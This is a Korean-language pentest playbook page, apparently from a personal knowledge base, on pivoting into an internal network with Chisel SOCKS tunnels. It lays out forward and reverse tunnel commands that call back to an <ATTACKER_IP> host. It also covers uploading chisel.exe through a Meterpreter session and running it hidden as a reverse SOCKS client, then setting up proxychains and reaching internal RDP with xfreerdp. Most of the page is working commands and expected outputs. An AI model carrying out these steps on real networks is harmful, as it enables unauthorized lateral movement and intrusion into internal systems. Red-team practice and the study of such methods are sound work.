---
tags:
  - 환경/linux
  - 환경/windows
시작조건: ["공격 호스트에서 직접 도달하지 못하는 <INTERNAL_IP>:<PORT> TCP 서비스 존재", "피벗 호스트 셀 확보", "피벗 호스트에서 <INTERNAL_IP>:<PORT> 연결 가능"]
필요권한: ["피벗 호스트에서 Chisel 바이너리를 실행할 현재 계정 권한"]
필요조건: ["forward 방식은 공격 호스트에서 <PIVOT_IP>:1234/TCP로 연결 가능", "reverse 방식은 피벗 호스트에서 <ATTACKER_IP>:1234/TCP로 연결 가능", "피벗 호스트에서 <INTERNAL_IP>:<PORT> TCP 연결 가능"]
결과: ["공격 호스트의 로컬 SOCKS 프록시", "공격 호스트에서 <INTERNAL_IP>:<PORT>까지의 TCP 경로"]
---

# Chisel SOCKS 터널링

## 한 줄 판단

공격 호스트에서 `<INTERNAL_IP>:<PORT>`에 직접 도달하지 못하지만 셀을 보유한 `<PIVOT_IP>`에서 해당 TCP 서비스에 연결할 수 있으면, Chisel server/client를 각 호스트에서 실행해 공격 호스트에 SOCKS 프록시와 내부 TCP 경로를 만든다.

## 사용할 때

- 현재 보유 정보·접근: 공격 호스트에서는 `<INTERNAL_IP>:<PORT>`가 닫히지만, 피벗 호스트의 셀에서는 `nc -vz <INTERNAL_IP> <PORT>`가 성공한다.
- 명령 실행 위치: Chisel server는 선택한 연결 방향의 listener 호스트에서, client는 그 listener로 연결할 호스트에서 실행한다.
- 현재 계정·권한: 피벗 호스트에 SSH 계정이 없어도 되지만, 현재 셀 계정으로 OS·아키텍처에 맞는 Chisel 바이너리를 실행할 수 있어야 한다.
- 지금 가능한 행동: 공격 호스트가 `<PIVOT_IP>:1234/TCP`로 연결할 수 있으면 forward, 피벗 호스트만 `<ATTACKER_IP>:1234/TCP`로 나갈 수 있으면 reverse SOCKS를 사용한다.
- 성공 범위: 공격 호스트의 SOCKS 포트에서 `<INTERNAL_IP>:<PORT>`까지 TCP를 전달할 수 있게 되며, 내부 서비스 인증·원격 명령 실행·관리자 권한은 별도로 검증해야 한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 공격 호스트↔피벗 호스트 중 최소 한 방향으로 `1234/TCP` 연결 가능 | forward는 공격 호스트→`<PIVOT_IP>:1234`, reverse는 피벗 호스트→`<ATTACKER_IP>:1234` 경로를 확인 | listener 바인딩 주소, VPN IP, 방화벽과 egress 방향 재확인 |
| 현재 계정 또는 인증 수단 | 피벗 호스트의 유지 중인 셀 | `whoami`, `hostname` | 셀 재연결 방법과 파일 전송 경로 확인 |
| 현재 권한 | 현재 계정으로 Chisel 실행 가능 | `uname -a` 또는 `systeminfo`로 OS·아키텍처를 확인하고 바이너리 실행 | 바이너리 아키텍처, libc, 실행 권한 확인 |
| 공격 대상의 조건 | 피벗 호스트에서 `<INTERNAL_IP>:<PORT>` TCP 연결 가능 | `nc -vz <INTERNAL_IP> <PORT>` | 피벗 호스트의 route·DNS·방화벽과 대상 listener 확인 |
| 필요한 파일·목록·주소 | 양쪽 OS·아키텍처에 맞는 Chisel과 `<ATTACKER_IP>`, `<PIVOT_IP>`, `<INTERNAL_IP>`, `<PORT>` | 바이너리 버전과 각 호스트의 주소를 비교 | 적합한 release와 올바른 인터페이스 주소로 교체 |

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 공격 호스트에서 `<PIVOT_IP>:1234` 접근 가능 | forward SOCKS 가능 | 피벗에서 server, 공격 호스트에서 client |
| 피벗 호스트에서만 공격 호스트로 egress 가능 | reverse SOCKS가 적합 | 공격 호스트에서 `--reverse` server |
| Chisel 실행 오류 | libc/아키텍처/버전 문제 | 대상 OS/아키텍처에 맞는 release 사용 |

### 절차
1. 공격 호스트와 피벗 호스트에서 각각 OS·아키텍처에 맞는 Chisel 바이너리를 준비한다.
2. forward라면 피벗 호스트에서 server, 공격 호스트에서 client를 실행한다. reverse라면 공격 호스트에서 `--reverse` server, 피벗 호스트에서 client를 실행한다.
3. 공격 호스트에 생성된 로컬 SOCKS 포트와 protocol을 ProxyChains 설정에 맞춘다.
4. 공격 호스트에서 `proxychains nc`로 `<INTERNAL_IP>:<PORT>`를 먼저 검증한 뒤, 같은 SOCKS 경로로 서비스 클라이언트를 실행한다.

### Forward SOCKS

```bash
./chisel server -v -p 1234 --socks5
./chisel client -v <PIVOT_IP>:1234 socks
```

확인할 출력:

- 공격 호스트의 Chisel client 쪽에 로컬 SOCKS listener가 생성된다. listener 생성은 터널 구성 성공이며, 아직 내부 서비스 인증 성공을 의미하지 않는다.

### Reverse SOCKS

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
./chisel client -v <ATTACKER_IP>:1234 R:1083:socks
```

확인할 출력:

- 공격 호스트의 Chisel server 쪽 `127.0.0.1:1083`에 reverse SOCKS listener가 생성된다. 피벗 호스트 client 연결 로그와 함께 확인한다.

### Windows Meterpreter 세션에서 Chisel 반입과 실행

Metasploit SOCKS에서 첫 TCP 연결 뒤 다음 연결이 timeout되고 Meterpreter 명령까지 응답하지 않으면, 새 세션을 확보한 뒤 Windows x64용 Chisel 실행 파일을 전송한다. 압축 파일이 아니라 압축을 푼 `chisel.exe`를 사용한다.

```text
meterpreter > upload <KALI_WINDOWS_AMD64_CHISEL> C:\\Windows\\Temp\\chisel.exe
meterpreter > execute -f C:\\Windows\\Temp\\chisel.exe -a "client <ATTACKER_IP>:1234 R:1083:socks" -H
```

공격 호스트에서 listener 소유 프로세스와 최종 TCP 연결을 차례로 확인한다.

```bash
ss -ltnp 'sport = :1083'

cat > ./chisel-socks.conf <<'EOF'
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1083
EOF

proxychains -f ./chisel-socks.conf nc -vz <INTERNAL_IP> <PORT>
```

`ss`에 `chisel` listener가 보이고 ProxyChains `OK`와 대상 포트 연결 성공이 함께 반환되어야 한다. `upload` 성공만으로 client 실행이나 reverse SOCKS 생성을 판단하지 않는다.

### 내부 RDP 접근

```bash
proxychains nc -vz <INTERNAL_IP> 3389
proxychains xfreerdp /v:<INTERNAL_IP> /u:<USER> /p:'<PASSWORD>'
```

확인할 출력:

- ProxyChains 체인 로그가 `OK`로 표시되면 공격 호스트에서 SOCKS를 거쳐 `<INTERNAL_IP>:3389` TCP까지 도달한 것이다.
- RDP 인증 창은 서비스 응답, GUI 세션은 `<USER>` 인증과 Remote Desktop 로그온 권한 확인이며 관리자 권한은 세션 내에서 별도로 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 피벗 호스트에서 내부 포트 `nc -vz`가 성공함 | 최종 hop은 도달 가능함 | 내부 TCP baseline 확보 | forward 또는 reverse 연결 방향 결정 |
| Chisel 양쪽 로그에 client·session이 연결되고 SOCKS listener가 생김 | server/client와 listener가 정상임 | SOCKS 프록시 생성 | ProxyChains protocol·port 설정 확인 |
| Meterpreter `upload` 뒤 공격 호스트의 `1083/TCP`를 Chisel이 listen | Windows client 실행과 reverse SOCKS 생성 성공 | Metasploit과 분리된 SOCKS 프록시 | `chisel-socks.conf`로 단일 내부 TCP 연결 확인 |
| `proxychains nc` 체인이 `OK`이고 내부 포트가 `open` | SOCKS를 통한 TCP 접근 성공 | 내부 서비스 접근 | 최종 서비스 클라이언트 실행 |
| RDP·웹·DB 클라이언트가 `<INTERNAL_IP>:<PORT>`의 서비스 응답을 받음 | 터널과 최종 TCP 경로가 모두 동작함 | 공격 호스트에서 내부 서비스 접근 | 서비스별 인증, 세션, 실제 권한을 별도 확인 |
| client 연결이 없음 | listener 방향, 주소, 포트 또는 방화벽이 맞지 않음 | 터널 미생성 | 어느 쪽에서 listen하고 connect하는지 재확인 |
| `exec format` 또는 libc 오류 | 대상 OS·arch와 바이너리가 맞지 않음 | Chisel 실행 불가 | 적합한 release로 교체 |
| SOCKS는 열렸지만 `nc`가 실패함 | 내부 대상 또는 SOCKS 설정 문제 | 프록시 listener만 확보 | 피벗 host baseline과 `socks5` 설정 비교 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 바이너리 실행 | Chisel version·arch와 실행 오류 없음 | 피벗 shell 권한으로 실행 가능한지 확인 |
| 내부 hop | 피벗 호스트의 `nc -vz` | 최종 내부 포트 baseline 확정 |
| listener·protocol | Chisel 연결 로그, SOCKS listen, `socks5` 설정 | 세션과 프록시 형식 일치 확인 |
| 최종 TCP | ProxyChains `OK`, `nc open`, 서비스 응답 | listener 생성과 실제 내부 접근을 구분 |

## 관련 상태 라우터

- 내부 대상까지의 TCP 경로가 검증됐으면: [[내부망 경로 확보 후 피벗 구성]]

## 관련 도구

- [[chisel]]
- [[proxychains]]
- [[netcat]]
- [[xfreerdp]]
